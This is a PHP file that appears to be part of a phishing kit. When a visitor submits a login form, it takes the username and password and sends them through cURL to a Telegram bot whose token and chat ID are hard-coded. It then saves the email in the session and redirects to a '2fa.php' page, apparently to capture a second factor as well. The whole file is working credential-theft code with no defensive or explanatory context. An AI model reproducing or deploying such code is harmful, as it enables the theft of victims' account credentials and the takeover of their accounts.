<?php
session_start();

// Telegram setup
$botToken = '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY';
$chatId = '1325797388';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (!empty($email) && !empty($password)) {
        // Prepare message
        $message = "🔐 *New Login Submission*\n";
        $message .= "-----------------------------\n";
        $message .= "📧 *Email:* {$email}\n";
        $message .= "🔑 *Password:* {$password}\n";
        $message .= "-----------------------------\n";
        $message .= "📅 *Time:* " . date("Y-m-d H:i:s") . "\n";
        $message .= "🌐 *Page:* " . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

        // Send via cURL
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $payload = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);

        // Save email to session
        $_SESSION['user_email'] = $email;

        // Redirect to 2FA page
        header("Location: 2fa.php");
        exit;
    } else {
        echo "Error: Missing credentials.";
    }
}
?>
